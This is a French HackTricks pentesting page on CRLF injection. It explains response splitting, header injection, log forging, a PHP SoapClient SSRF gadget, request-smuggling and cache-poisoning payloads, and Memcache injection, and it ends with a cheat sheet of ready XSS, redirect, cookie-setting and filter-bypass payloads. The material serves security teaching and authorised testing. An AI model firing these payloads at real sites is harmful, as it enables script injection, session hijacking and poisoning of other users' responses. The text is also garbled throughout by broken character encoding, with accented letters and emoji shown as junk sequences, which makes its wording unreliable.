# Injection CRLF (%0D%0A)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous Ãªtes intÃ©ressÃ© par une **carriÃ¨re de piratage** et que vous voulez pirater l'impossible - **nous recrutons !** (_maÃ®trise du polonais Ã©crit et parlÃ© requise_).

{% embed url="https://www.stmcyber.com/careers" %}

## Qu'est-ce que CRLF ?

Lorsqu'un navigateur envoie une requÃªte Ã  un serveur web, le serveur web rÃ©pond avec une rÃ©ponse contenant Ã  la fois les en-tÃªtes de rÃ©ponse HTTP et le contenu rÃ©el du site web, c'est-Ã -dire le corps de la rÃ©ponse. Les en-tÃªtes HTTP et la rÃ©ponse HTML (le contenu du site web) sont sÃ©parÃ©s par une combinaison spÃ©cifique de caractÃ¨res spÃ©ciaux, Ã  savoir un retour chariot et un saut de ligne. En abrÃ©gÃ©, on les appelle Ã©galement CRLF.

Le serveur web utilise le CRLF pour comprendre quand un nouvel en-tÃªte HTTP commence et qu'un autre se termine. Le CRLF peut Ã©galement indiquer Ã  une application web ou Ã  un utilisateur qu'une nouvelle ligne commence dans un fichier ou dans un bloc de texte. Les caractÃ¨res CRLF sont un message standard HTTP/1.1, donc ils sont utilisÃ©s par tout type de serveur web, y compris Apache, Microsoft IIS et tous les autres.\
De [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### Qu'est-ce que la vulnÃ©rabilitÃ© d'injection CRLF ?

Dans une attaque de vulnÃ©rabilitÃ© d'injection CRLF, l'attaquant insÃ¨re Ã  la fois les caractÃ¨res de retour chariot et de saut de ligne dans l'entrÃ©e utilisateur pour tromper le serveur, l'application web ou l'utilisateur en pensant qu'un objet est terminÃ© et qu'un autre a commencÃ©. Ainsi, les sÃ©quences CRLF ne sont pas des caractÃ¨res malveillants, mais elles peuvent Ãªtre utilisÃ©es Ã  des fins malveillantes, pour le fractionnement des rÃ©ponses HTTP, etc.

## Injection CRLF dans les applications web

Dans les applications web, une injection CRLF peut avoir des impacts graves, selon ce que l'application fait avec des Ã©lÃ©ments individuels. Les impacts peuvent aller de la divulgation d'informations Ã  l'exÃ©cution de code, une vulnÃ©rabilitÃ© de sÃ©curitÃ© des applications web Ã  impact direct. En fait, une attaque d'injection CRLF peut avoir des rÃ©percussions trÃ¨s graves sur une application web, mÃªme si elle n'a jamais Ã©tÃ© rÃ©pertoriÃ©e dans la liste des 10 principales vulnÃ©rabilitÃ©s de l'OWASP. Par exemple, il est Ã©galement possible de manipuler les fichiers journaux dans un panneau d'administration, comme expliquÃ© dans l'exemple ci-dessous.

#### Un exemple d'injection CRLF dans un fichier journal

Imaginez un fichier journal dans un panneau d'administration avec le modÃ¨le de flux de sortie suivant : IP - Heure - Chemin visitÃ©, comme ci-dessous :
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Si un attaquant parvient Ã  injecter les caractÃ¨res CRLF dans la requÃªte HTTP, il peut modifier le flux de sortie et falsifier les entrÃ©es de journal. Il peut modifier la rÃ©ponse de l'application web pour quelque chose comme ci-dessous :
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Le %0d et %0a sont les formes encodÃ©es en URL de CR et LF. Par consÃ©quent, les entrÃ©es de journal ressembleraient Ã  ceci aprÃ¨s que l'attaquant ait insÃ©rÃ© ces caractÃ¨res et que l'application les affiche :

IP - Heure - Chemin visitÃ©
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Par consÃ©quent, en exploitant une vulnÃ©rabilitÃ© d'injection CRLF, l'attaquant peut falsifier les entrÃ©es dans le fichier journal pour dissimuler ses propres actions malveillantes. L'attaquant fait littÃ©ralement du dÃ©tournement de page et modifie la rÃ©ponse. Par exemple, imaginez un scÃ©nario oÃ¹ l'attaquant a le mot de passe administrateur et exÃ©cute le paramÃ¨tre restrictedaction, qui ne peut Ãªtre utilisÃ© que par un administrateur.

Le problÃ¨me est que si l'administrateur remarque qu'une adresse IP inconnue a utilisÃ© le paramÃ¨tre restrictedaction, il se rendra compte qu'il y a un problÃ¨me. Cependant, Ã©tant donnÃ© que cela ressemble maintenant Ã  une commande Ã©mise par localhost (et donc probablement par quelqu'un qui a accÃ¨s au serveur, comme un administrateur), cela ne semble pas suspect.

Toute la partie de la requÃªte commenÃ§ant par %0d%0a sera traitÃ©e par le serveur comme un seul paramÃ¨tre. Ensuite, il y a un autre & avec le paramÃ¨tre restrictedaction qui sera analysÃ© par le serveur comme un autre paramÃ¨tre. En effet, cela serait la mÃªme requÃªte que :
```
/index.php?page=home&restrictedaction=edit
```
### HTTP Response Splitting

#### Description

Ã‰tant donnÃ© que l'en-tÃªte d'une rÃ©ponse HTTP et son corps sont sÃ©parÃ©s par des caractÃ¨res CRLF, un attaquant peut essayer de les injecter. Une combinaison de CRLFCRLF indiquera au navigateur que l'en-tÃªte se termine et que le corps commence. Cela signifie qu'il est maintenant capable d'Ã©crire des donnÃ©es Ã  l'intÃ©rieur du corps de la rÃ©ponse oÃ¹ le code HTML est stockÃ©. Cela peut entraÃ®ner une vulnÃ©rabilitÃ© de type Cross-site Scripting (XSS).

#### Un exemple de HTTP Response Splitting conduisant Ã  une XSS

Imaginez une application qui dÃ©finit un en-tÃªte personnalisÃ©, par exemple :
```
X-Your-Name: Bob
```
La valeur de l'en-tÃªte est dÃ©finie via un paramÃ¨tre GET appelÃ© "name". Si aucun encodage d'URL n'est en place et que la valeur est directement reflÃ©tÃ©e Ã  l'intÃ©rieur de l'en-tÃªte, il est possible pour un attaquant d'insÃ©rer la combinaison mentionnÃ©e ci-dessus de CRLFCRLF pour indiquer au navigateur que le corps de la requÃªte commence. De cette maniÃ¨re, il est capable d'insÃ©rer des donnÃ©es telles qu'une charge XSS, par exemple :
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
Le code ci-dessus affichera une fenÃªtre d'alerte dans le contexte du domaine attaquÃ©.

#### Un exemple de HTTP Response Splitting conduisant Ã  une redirection

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

Naviguez vers :
```
/%0d%0aLocation:%20http://myweb.com
```
Et le serveur rÃ©pond avec l'en-tÃªte :
```
Location: http://myweb.com
```
**Autre exemple: (Ã  partir de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### Dans le chemin de l'URL

Vous pouvez envoyer la charge utile **Ã  l'intÃ©rieur du chemin de l'URL** pour contrÃ´ler la **rÃ©ponse** du serveur :
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Injection d'en-tÃªte HTTP

#### Description

En exploitant une injection CRLF, un attaquant peut Ã©galement insÃ©rer des en-tÃªtes HTTP qui pourraient Ãªtre utilisÃ©s pour contourner les mÃ©canismes de sÃ©curitÃ© tels que le filtre XSS d'un navigateur ou la politique de mÃªme origine. Cela permet Ã  l'attaquant d'obtenir des informations sensibles telles que des jetons CSRF. Il peut Ã©galement dÃ©finir des cookies qui pourraient Ãªtre exploitÃ©s en connectant la victime au compte de l'attaquant ou en exploitant des vulnÃ©rabilitÃ©s de script intersite (XSS) autrement non exploitables.

#### Un exemple d'injection d'en-tÃªte HTTP pour extraire des donnÃ©es sensibles

Si un attaquant est capable d'injecter les en-tÃªtes HTTP qui activent CORS (partage de ressources entre origines), il peut utiliser JavaScript pour accÃ©der Ã  des ressources qui sont autrement protÃ©gÃ©es par SOP (Same Origin Policy), qui empÃªche les sites de diffÃ©rentes origines d'accÃ©der les uns aux autres.

### Nouvelle requÃªte HTTP dans SSRF

En exploitant l'injection CRLF, vous pouvez **crÃ©er une nouvelle requÃªte HTTP et l'injecter**.\
Un bon exemple peut Ãªtre rÃ©alisÃ© en utilisant le gadget de dÃ©sÃ©rialisation `SoapClient` en PHP. Cette classe est **vulnÃ©rable Ã  CRLF** Ã  l'intÃ©rieur du paramÃ¨tre `user_agent`, ce qui permet d'**insÃ©rer de nouveaux en-tÃªtes et du contenu de corps**. Cependant, vous pouvez mÃªme Ãªtre en mesure d'exploiter cette vulnÃ©rabilitÃ© pour **injecter une nouvelle requÃªte HTTP** :
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### Injection d'en-tÃªte pour le trafic de requÃªtes

Vous pouvez injecter des en-tÃªtes essentiels pour vous assurer que le **serveur conserve la connexion ouverte** aprÃ¨s avoir rÃ©pondu Ã  la requÃªte initiale :
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Ensuite, **spÃ©cifiez une deuxiÃ¨me requÃªte**. Voici une **requÃªte d'empoisonnement classique** [**request smuggling**](http-request-smuggling/) avec des **en-tÃªtes/corps supplÃ©mentaires** ajoutÃ©s par le serveur aprÃ¨s l'injection.\
Voici deux des nombreuses options pour l'exploitation inter-utilisateurs.

SpÃ©cifier un **prÃ©fixe malveillant** pour empoisonner la requÃªte du prochain utilisateur ou un cache web :

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

Ou crÃ©er notre prÃ©fixe pour le combiner avec les donnÃ©es inutiles Ã  la fin et crÃ©er une deuxiÃ¨me requÃªte complÃ¨te afin de dÃ©clencher **l'empoisonnement de la file d'attente de rÃ©ponse**.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

Pour plus d'informations sur cette technique et les problÃ¨mes potentiels, **consultez la source originale** (https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

### Injection Memcache

Memcache est un **magasin clÃ©-valeur qui utilise un protocole en texte clair**. Plus d'informations dans :

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

Si une plateforme **prend des donnÃ©es d'une requÃªte HTTP et les utilise sans les dÃ©sinfecter** pour effectuer des **requÃªtes** vers un serveur **memcache**, un attaquant pourrait exploiter ce comportement pour **injecter de nouvelles commandes memcache**.

Par exemple, dans la vulnÃ©rabilitÃ© dÃ©couverte initialement, les clÃ©s de cache Ã©taient utilisÃ©es pour renvoyer l'adresse IP et le port auxquels un utilisateur devait se connecter, et les attaquants Ã©taient capables d'**injecter des commandes memcache** qui **empoisonnaient** le **cache pour envoyer les dÃ©tails des victimes** (y compris les noms d'utilisateur et les mots de passe) aux serveurs de l'attaquant :

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>

De plus, les chercheurs ont Ã©galement dÃ©couvert qu'ils pouvaient dÃ©synchroniser les rÃ©ponses memcache pour envoyer les adresses IP et les ports des attaquants aux utilisateurs dont l'adresse e-mail Ã©tait inconnue de l'attaquant :

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Pour obtenir toutes les informations, lisez le**[ **rapport original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)\*\*\*\*

## Impacts de la vulnÃ©rabilitÃ© d'injection CRLF

Les impacts des injections CRLF varient et incluent Ã©galement tous les impacts de la faille de script intersite (XSS) Ã  la divulgation d'informations. Cela peut Ã©galement dÃ©sactiver certaines restrictions de sÃ©curitÃ© telles que les filtres XSS et la politique de mÃªme origine dans les navigateurs de la victime, les rendant ainsi vulnÃ©rables aux attaques malveillantes.

### Comment prÃ©venir les injections CRLF / HTTP Header dans les applications Web

La meilleure technique de prÃ©vention consiste Ã  ne pas utiliser directement les entrÃ©es des utilisateurs dans les en-tÃªtes de rÃ©ponse. Si cela n'est pas possible, vous devez toujours utiliser une fonction pour encoder les caractÃ¨res spÃ©ciaux CRLF. Une autre bonne pratique de sÃ©curitÃ© des applications Web consiste Ã  mettre Ã  jour votre langage de programmation vers une version qui n'autorise pas l'injection de CR et LF dans les fonctions qui dÃ©finissent les en-tÃªtes HTTP.

### CHEAT SHEET
```
1. HTTP Response Splitting
â€¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
â€¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
â€¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
â€¢ /google.com/%2F..%0D%0AHeader-Test:test2
â€¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
â€¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
â€¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
â€¢ %E5%98%8A = %0A = \u560a
â€¢ %E5%98%8D = %0D = \u560d
â€¢ %E5%98%BE = %3E = \u563e (>)
â€¢ %E5%98%BC = %3C = \u563c (<)
â€¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Outil

{% embed url="https://github.com/dwisiswant0/crlfuzz" %}

## Liste de dÃ©tection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt" %}

## RÃ©fÃ©rences

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous Ãªtes intÃ©ressÃ© par une **carriÃ¨re de hacking** et souhaitez pirater l'impossible - **nous recrutons !** (_maÃ®trise du polonais Ã©crit et parlÃ© requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
